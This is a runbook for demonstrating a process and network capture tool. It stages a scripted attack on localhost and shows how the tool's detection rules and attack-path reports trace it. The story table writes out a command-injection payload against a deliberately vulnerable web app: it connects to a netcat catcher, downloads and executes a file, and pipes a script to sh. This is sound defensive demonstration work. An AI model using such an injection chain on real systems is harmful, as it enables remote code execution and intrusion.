# The capture demo: "give me a port, show me what happened"

The query is a real deliverable, not built only for the demo: `tools/p15-trace` (STATE 19.4) on a real `p15d` run. The demo adds one scripted story to run it on, [`tools/demo/run_demo.sh`](../../tools/demo/run_demo.sh) (STATE 19.5).

## Before the meeting (VM `p15-dev-2604`)

```bash
cd ~/fiery-dragon && git fetch -q && git checkout -q feat/demo && git pull -q && git submodule update --init --recursive
python3 -m venv ~/p15venv && ~/p15venv/bin/pip install -q --require-hashes --only-binary=:all: -r python/requirements.txt
make clean && make -j4 && sudo make smoke && sudo make smoke-net        # spine and network self-tests on 7.0.0-38
sudo P15_PYTHON=$HOME/p15venv/bin/python3 tools/demo/run_demo.sh ~/demo-$(date +%m%d-%H%M)
```

- The run takes about 40 s.
- It leaves in the output folder:
  - the WAL run directory;
  - `story.log`, with the PIDs the story started;
  - `port-8080`, `port-4444` and `port-4442`, each as `.txt` and `.html`;
  - `p15w-inspect.txt` and `SHA256SUMS`.
- Copy the folder to the laptop: `scp -r p15:demo-… .`. Open the HTML reports in a browser; they need no network.
- Run it once the day before, and keep that folder as the fallback.
- For the evidence:
  - `sha256sum` the folder's SHA256SUMS;
  - commit the text reports, `story.log` and `p15w-inspect.txt` under `docs/evidence/demo/<date>/`;
  - the WAL itself can go there too: it is small.

## The story (all on 127.0.0.1)

| Step | What runs | What the capture should show |
|---|---|---|
| 1 | `nc -l 127.0.0.1 4444`, standing in for an attacker's catcher | LISTEN on 4444 by `nc` |
| 2 | `tools/demo/webapp.py 8080`, a web app with a command-injection bug, on purpose | BIND and LISTEN on 8080 by `python3` |
| 3 | three ordinary `curl` requests | 3 CONNECTs and 3 ACCEPTs on 8080, each client found by endpoints |
| 2b | a stager, `python3 -m http.server 8000`, serving `k` (a copy of `id`) and `s2` (a script) | BIND and LISTEN on 8000 |
| 4 | one request that injects `; nc -w1 127.0.0.1 4444; curl …/k -o /tmp/.k; chmod +x /tmp/.k; /tmp/.k; curl …/s2 \| sh` | an ACCEPT on 8080, then `python3` → `sh`; `sh` → `nc` and its CONNECT to 4444, accepted by the catcher; `curl` writes `/tmp/.k` and a child of `sh` runs it (rule R1); `s2` runs `id` from a memfd (R2) and from a file it deleted (R3) |
| 5 | blocking connects to 4441-4443 | three CONNECTs, ret −111 (ECONNREFUSED), by `bash` |

A dry run in the cloud container already captured the step-4 chain in the spine: `nc (31940) ← sh (31938) ← python3 (31908)`, with the injected command line. That run had network capture off, because the container refuses fexit (E-0078). See [the dry run](../evidence/demo/2026-11-02-container-dry-run/README.md).

## Talking points, in order

With `--flow` (the default the VM test package uses), the demo ends by building the run's graph and printing two more outputs, also written to the output folder:
- `rules.txt`: the four detection rules over the graph (`python3 -m p15.graph.rules`): R1 dropper, R2 memfd-exec, R3 deleted-exec, R4 net-shell.
- `attack-path.txt` and `attack-path.html`: the attack path from the shell the web app started (`python3 -m p15.graph.story`). It walks backward and forward over the graph, keeps the processes, sockets and the files that carry the story, and leaves out libraries and other files only read on the way.

Expect R4 to fire twice: once for the injected shell, and once for an ordinary lookup, because the web app starts a shell for every lookup. The attack path starts from the R4 alert that leads to the other alerts. Rules are patterns, not verdicts, and that is a point to make.


1. **`tools/p15-trace --port 8080 RUN`**: who listened (the web app, and its parent), each accepted connection and its client process (`curl`), and the trust line at the top: capture valid, invariant closed, NET records lost 0.
2. **`--port 4444`**: the money shot. The connect to 4444 came from `nc`, whose parent is `sh`, whose parent is **the web server**. The command line shows the injection. The catcher's accept is joined to it.
3. **`--port 4442`**: a refused connect, and which process tried it.
4. **The HTML report** for 4444: the map (who connected → port → who accepted), the timeline (lanes per process, lifespans), the processes with their lineage.
5. **How far to trust it** (the last section of each report, and the `Trust` block):
   - every join says whether it is exact (cookie) or an inference (endpoints);
   - processes that started before the capture are labelled, not guessed;
   - nothing is dropped without a counter (STATS/NET_STATS; GAP windows).

## The storybook: the attack path, told step by step

`run_demo.sh` also writes `attack-path.json` (the path as a story document) and `storybook.html`, a page that plays the attack path one edge at a time (`python3 -m p15.graph.viewer`; `p15.graph.story --json --viewer`). The page is one file and fetches nothing, so it opens from the copied folder on the laptop like the other reports.

- **What it shows:** the same nodes, edges, times and alerts as `attack-path.txt`, laid out in time order with sockets above the process line and files below. Chapters are found from the data: how the start was reached (the cause chain), the start, then one chapter per command the injected shell ran (children forked within 2 ms, such as the two ends of `curl … | sh`, share one), then what followed. Each alert is flagged on the timeline at the EXECUTE that fired it.
- **Driving it:** `Play`, or `→` and `←` one edge at a time; `Page Down` for the next chapter; click a box for all its edges, and an edge in that list to jump to it; `O` shows the whole graph. The camera follows the story until you drag or zoom; `F` turns following back on. `How to read this` explains every mark.
- **The recorded run of 14 November** is [`storybook-2026-11-14.html`](storybook-2026-11-14.html), read back from the committed evidence ([`attack-path.txt`](../evidence/vm/2026-11-14-demo/attack-path.txt), with `rules.txt` for the alert off the path). It is the fallback if the live run fails. Regenerate it after a change to the page or the parser (a test fails while it is stale):

  ```bash
  E=docs/evidence/vm/2026-11-14-demo
  PYTHONPATH=python python3 -m p15.graph.viewer --from-text $E/attack-path.txt --rules $E/rules.txt \
      --manifest $E/manifest.txt --title "The demo attack, 14 November 2026" -o docs/demo/storybook-2026-11-14.html
  ```

- **What it is not:** it decides nothing. The page lays out p15.graph.story's output and plays it; the reading back of a text report is strict, so a line it does not recognise is an error with its line number, never a shorter story. Times read back from text have millisecond precision.

## What to say if asked

- **"Why no parent for the shell that ran the script?"** It started before the capture. Its parent comes with the start-up snapshot (Phase 1 step 4c), and the report says so instead of inventing one.
- **"Why does nc's connect say 'in progress'?"** `nc -w` connects non-blocking. NET records the connect call's own return value (ADR-0004 rule 3). The outcome is visible because the catcher's ACCEPT is joined to it. Blocking connects, like the scan's, return the refusal directly.
- **"Is the client join exact?"** For TCP, yes: the connect and the accept carry the same client sequence number (ADR-0022), so the join doesn't depend on which call returned first (on the VM an accept was stamped 12 µs before its own connect, E-0092). Without that number (an old run, UDP), it falls back to endpoints on the same host, same netns, the connect nearest in time within 5 s, labelled as an inference. The listener join is exact, by socket cookie.
- **"What about data volumes, files, DNS?"** Not in this slice. NET records intent (connect, accept, listen, bind). Bytes and files are Phases 2 and 3 (ADR-0005, 0010).
- **"How does this feed PIDSMaker?"** These are the same records the graph is built from: processes as nodes keyed by ADR-0009, sockets keyed by cookie. The graph export is the Phase-3 step after the capture layer is complete.

## If something fails on the day

- **`run_demo` exits 2:** a prerequisite is missing. The message names it.
- **`p15d` exits non-zero:** the reason is in `OUT/p15d.err`, and in the END record (`p15w-inspect.txt`). Show the fallback folder.
- **Never** edit a report by hand: they are generated from the WAL, and the SHA256SUMS would no longer match.
